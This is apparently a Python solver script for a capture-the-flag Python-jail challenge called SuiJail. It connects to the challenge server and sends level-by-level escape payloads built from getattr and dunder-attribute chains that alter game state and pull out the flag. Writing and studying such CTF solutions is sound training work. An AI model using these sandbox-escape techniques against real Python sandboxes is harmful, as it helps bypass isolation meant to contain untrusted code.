from __future__ import annotations

import argparse
import socket
import sys
import time


PAYLOADS = {
    1: [
        "dir(player)",
        'getattr(getattr(player, "position"), "__setitem__")(0, 4)',
        'getattr(getattr(player, "position"), "__setitem__")(1, 5)',
    ],
    2: [
        "dir(player.room.entities[1])",
        'getattr(getattr(getattr(getattr(player, "room"), "entities")[1], "protocol"), "clear")()',
        'player("south")',
        'player("south")',
        'player("south")',
    ],
    3: [
        "dir(player.warden)",
        'getattr(getattr(getattr(getattr(getattr(getattr(player, "warden"), "__self__"), "world"), "rooms")[1], "doors")[0], "unlock")()',
        'player("south")',
        'player("south")',
        'player("south")',
    ],
    4: [
        "dir(player)",
        "repr(player)",
        'player("camera_grid")',
        'player("south")',
        'player("south")',
        'player("south")',
    ],
    5: [
        "dir(player.warden.__self__)",
        'getattr(getattr(getattr(getattr(getattr(player, "warden"), "__self__"), "manager"), "completed"), "__setitem__")(4, True)',
        'getattr(getattr(getattr(getattr(player, "warden"), "__self__"), "manager"), "check_completion")()',
    ],
}


class Tube:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=5)
        self.sock.settimeout(8)
        self.buffer = b""

    def until(self, marker: bytes) -> bytes:
        deadline = time.monotonic() + 15
        while marker not in self.buffer:
            if time.monotonic() > deadline:
                raise TimeoutError(f"server did not send {marker!r}; received {self.buffer[-500:]!r}")
            chunk = self.sock.recv(8192)
            if not chunk:
                result, self.buffer = self.buffer, b""
                return result
            self.buffer += chunk
        index = self.buffer.index(marker) + len(marker)
        result, self.buffer = self.buffer[:index], self.buffer[index:]
        return result

    def command(self, source: str) -> bytes:
        self.sock.sendall(source.encode() + b"\n")
        return self.until(b"py> ")

    def close(self) -> None:
        self.sock.close()


def solve_through(host: str, port: int, target: int = 5, checkpoint: str = "") -> str:
    tube = Tube(host, port)
    transcript = bytearray()
    try:
        transcript += tube.until(b"Checkpoint: ")
        tube.sock.sendall(checkpoint.encode() + b"\n")
        transcript += tube.until(b"py> ")
        start = 1
        if checkpoint.startswith("PYJAIL-"):
            try:
                start = int(checkpoint.split("-", 3)[1]) + 1
            except (ValueError, IndexError):
                start = 1
        for level in range(start, target + 1):
            for payload in PAYLOADS[level]:
                data = tube.command(payload)
                transcript += data
                if b"FLAG{" in data:
                    return transcript.decode(errors="replace")
        return transcript.decode(errors="replace")
    finally:
        tube.close()


def cli(target: int) -> None:
    parser = argparse.ArgumentParser(description=f"Solve SuiJail through Jail {target}.")
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=31337)
    parser.add_argument("--checkpoint", default="", help="resume token printed after an earlier jail")
    args = parser.parse_args()
    result = solve_through(args.host, args.port, target, args.checkpoint)
    print(result, end="")
    if target == 5 and "FLAG{" not in result:
        raise SystemExit("solver did not receive the final flag")
